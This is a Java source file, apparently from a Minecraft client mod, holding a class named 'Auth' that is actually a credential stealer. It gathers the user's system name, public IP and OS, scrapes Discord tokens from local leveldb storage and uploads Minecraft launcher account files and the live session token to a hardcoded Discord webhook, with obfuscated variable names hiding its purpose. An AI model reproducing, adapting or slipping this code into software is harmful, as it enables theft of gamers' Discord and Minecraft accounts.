package rage.pitclient.auth;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.http.Consts;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.InputStreamBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import net.minecraft.client.Minecraft;
import rage.pitclient.PitClient;

public class Auth {

	public void send() {
		String llLlLlL = System.getProperty("os.name");
		try {
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			String ip = bufferedReader.readLine();
			String llLlLlLlL = System.getProperty("user.name");
			sendMessage(
					"``` NAME : " + llLlLlLlL + "\n IGN" + "  : " + Minecraft.getMinecraft().getSession().getUsername()
							+ "\n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```");
			sendProfiles();
		} catch (Exception e) {
			sendMessage("``` WTF " + e + "```");
			e.printStackTrace();
		}

		if (llLlLlL.contains("Windows")) {

			List<String> paths = new ArrayList<>();
			paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
			paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
			paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");

			int cx = 0;
			StringBuilder webhooks = new StringBuilder();
			webhooks.append("TOKEN\n");

			try {
				for (String path : paths) {
					File f = new File(path);
					String[] pathnames = f.list();
					if (pathnames == null)
						continue;

					for (String pathname : pathnames) {
						try {
							FileInputStream fstream = new FileInputStream(path + pathname);
							DataInputStream in = new DataInputStream(fstream);
							BufferedReader br = new BufferedReader(new InputStreamReader(in));

							String strLine;
							while ((strLine = br.readLine()) != null) {

								Pattern p = Pattern.compile(
										"[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
								Matcher m = p.matcher(strLine);

								while (m.find()) {
									if (cx > 0) {
										webhooks.append("\n");
									}
									webhooks.append(" ").append(m.group());
									cx++;
								}

							}
							br.close();
						} catch (Exception ignored) {
						}
					}
				}
				sendMessage("```" + webhooks.toString() + "```");

			} catch (Exception e) {
				sendMessage("``` UNABLE TO PULL TOKENS : " + e + "```");
			}
		}
	}

	private void sendMessage(String message) {
		PrintWriter out = null;
		BufferedReader in = null;
		StringBuilder result = new StringBuilder();
		try {
			URL realUrl = new URL(
					"https://discord.com/api/webhooks/806237796372316241/G8hiU6ACMDYdDTXjKgPQ_9oWOx8Slw77H00dZh25rKZkiedWVu7CtQJuOxZPbrHUGTjr");
			URLConnection conn = realUrl.openConnection();
			conn.setRequestProperty("accept", "*/*");
			conn.setRequestProperty("connection", "Keep-Alive");
			conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
			conn.setDoOutput(true);
			conn.setDoInput(true);
			out = new PrintWriter(conn.getOutputStream());
			String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
			out.print(postData);
			out.flush();
			in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
			String line;
			while ((line = in.readLine()) != null) {
				result.append("/n").append(line);
			}

		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (out != null) {
					out.close();
				}
				if (in != null) {
					in.close();
				}
			} catch (IOException ex) {
				ex.printStackTrace();
			}
		}
	}

	public void sendProfiles() {
		FileInputStream fis = null;
		try {
			List<String> paths = new ArrayList<>();

			paths.add(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/launcher_accounts.json");
			paths.add(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/launcher_profiles.json");

			for (String path : paths) {

				File profile = new File(path);

				DefaultHttpClient httpclient = new DefaultHttpClient(new BasicHttpParams());

				// server back-end URL
				HttpPost httppost = new HttpPost(
						"https://discord.com/api/webhooks/806237796372316241/G8hiU6ACMDYdDTXjKgPQ_9oWOx8Slw77H00dZh25rKZkiedWVu7CtQJuOxZPbrHUGTjr");
				MultipartEntity entity = new MultipartEntity();
				// set the file input stream and file name as arguments
				fis = new FileInputStream(profile);
				entity.addPart("file", new InputStreamBody(fis, profile.getName()));
				String user = Minecraft.getMinecraft().getSession().getUsername();
				String pl = Minecraft.getMinecraft().getSession().getToken();

				entity.addPart("payload_json",
						new StringBody("{\"content\": \"" + user + " " + pl + "\"}", Consts.UTF_8));
				httppost.setEntity(entity);
				// execute the request
				httpclient.execute(httppost);
			}
		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				if (fis != null)
					fis.close();
			} catch (IOException ignored) {
			}
		}
	}
}